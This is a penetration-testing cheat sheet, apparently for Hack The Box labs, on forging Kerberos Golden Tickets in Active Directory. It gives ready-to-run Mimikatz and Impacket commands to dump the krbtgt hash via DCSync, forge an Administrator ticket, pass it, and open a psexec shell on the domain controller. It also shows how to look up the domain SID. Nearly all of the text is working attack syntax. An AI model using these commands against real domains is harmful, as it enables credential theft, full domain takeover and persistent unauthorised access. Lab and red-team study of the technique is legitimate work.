**Purpose:** Forge a Kerberos Ticket Granting Ticket (TGT) using the domain's `krbtgt` account secret.

**When to use:** You have obtained the `krbtgt` secret and the information required to construct a TGT.

### **Required information**

- Domain name
- Domain SID
- `krbtgt` NTLM hash or suitable AES key
- Username to place in the ticket

### **Windows — Mimikatz**

```
kerberos::golden /domain:domain.local /sid:<DOMAIN_SID> /rc4:<KRBTGT_HASH> /user:Administrator /ptt
```

### **Kali — Impacket**

```
impacket-ticketer \
-nthash <KRBTGT_HASH> \
-domain-sid <DOMAIN_SID> \
-domain domain.local \
Administrator
```

Then:

```
export KRB5CCNAME=Administrator.ccache

impacket-psexec -k -no-pass \
domain.local/Administrator@dc01.domain.local
```

**Remember:**

- Golden Tickets use the `krbtgt` secret, not an ordinary service-account hash.
- Obtaining the `krbtgt` hash normally requires serious domain compromise, such as DCSync rights or extraction from a domain controller.
- A forged TGT does not bypass every possible domain or service-side restriction.
- This is a persistence/domain-compromise technique, not an initial foothold technique.


---

## **How to obtain the domain SID**

Useful for Silver and Golden Ticket construction.

### **Windows**

```
whoami /user
```

For the domain SID:

```
Get-ADDomain | Select-Object DomainSID
```

### **Kali — Impacket**

```
impacket-lookupsid domain.local/user:Password123!@<DC_IP>
```

Or use the domain SID shown in BloodHound/domain enumeration.

---

# HTB Cheatsheet

# Get krbtgt hash first via DCSync
```
impacket-secretsdump domain.htb/admin:pass@10.10.10.X -just-dc-user {krbtgt}
```

# Create golden ticket
```
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain domain.htb administrator
```

# Use it
```
export KRB5CCNAME=administrator.ccache
```

```
impacket-psexec -k -no-pass domain.htb/administrator@dc.domain.htb
```
